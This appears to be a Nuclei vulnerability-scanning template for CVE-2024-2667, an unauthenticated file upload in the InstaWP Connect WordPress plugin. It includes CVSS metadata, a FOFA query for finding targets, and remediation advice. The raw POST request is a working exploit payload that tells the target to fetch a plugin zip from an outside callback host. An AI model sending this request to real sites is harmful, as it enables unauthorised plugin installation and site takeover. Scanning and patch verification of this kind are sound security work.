http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"status":true'
    - '"message":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /?rest_route=/instawp-connect/v1/config HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    api_key={{randstr}}&override_plugin_zip=http://{{interactsh-url}}

    '
id: CVE-2024-2667
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:instawp:instawp_connect:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-2667
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.9956
    epss-score: 0.90137
  description: "The InstaWP Connect \u2013 1-click WP Staging & Migration plugin for\
    \ WordPress is vulnerable to arbitrary file uploads due to  insufficient file\
    \ validation in the /wp-json/instawp-connect/v1/config REST API endpoint in all\
    \ versions up to, and including, 0.1.0.22. This makes it possible for unauthenticated\
    \ attackers to upload arbitrary files.\n"
  impact: 'Unauthenticated attackers can install and activate arbitrary WordPress
    plugins including vulnerable or malicious ones via the InstaWP Connect REST API
    endpoint.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/instawp-connect/"
    framework: wordpress
    max-request: 1
    product: instawp_connect
    vendor: instawp
    verified: true
  name: InstaWP Connect <= 0.1.0.22 - Unauthenticated Arbitrary File Upload
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/f6aead8d-c136-4952-ad03-86fe0f144dea?source=cve
  - https://github.com/Nxploited/CVE-2024-2667-Poc
  - https://github.com/Puvipavan/CVE-2024-2667
  remediation: 'Update InstaWP Connect plugin to version 0.1.0.23 or later.

    '
  severity: critical
  tags: cve,cve2024,wordpress,wp-plugin,wp,instawp-connect,intrusive,file-upload,vkev,vuln
